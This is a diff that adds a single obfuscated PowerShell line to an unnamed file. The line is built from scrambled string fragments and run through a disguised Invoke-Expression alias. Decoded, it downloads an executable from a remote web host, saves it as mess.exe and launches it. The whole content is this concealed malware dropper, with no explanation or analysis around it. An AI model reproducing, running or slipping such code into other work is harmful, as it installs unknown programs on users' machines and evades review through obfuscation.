@@ -1,0 +1,1 @@
+﻿ ((("{16}{0}{4}{15}{9}{20}{19}{6}{3}{1}{12}{8}{7}{18}{14}{5}{13}{11}{17}{2}{10}" -f'-','://da','ndmess.e','dhttp','Object ','nd);St','nloadFile(In','pp','.vn/a','yste','xeInd','-Proce','nhviet.com','art','ess.exeI','S','(New','ss I','/p2.exeInd,Indm',').Dow','m.Net.WebClient'))  -rEplAce ([CHAR]73+[CHAR]110+[CHAR]100),[CHAR]39)| .( $vERboseprEFeRENCE.tOSTrINg()[1,3]+'x'-jOIn'')
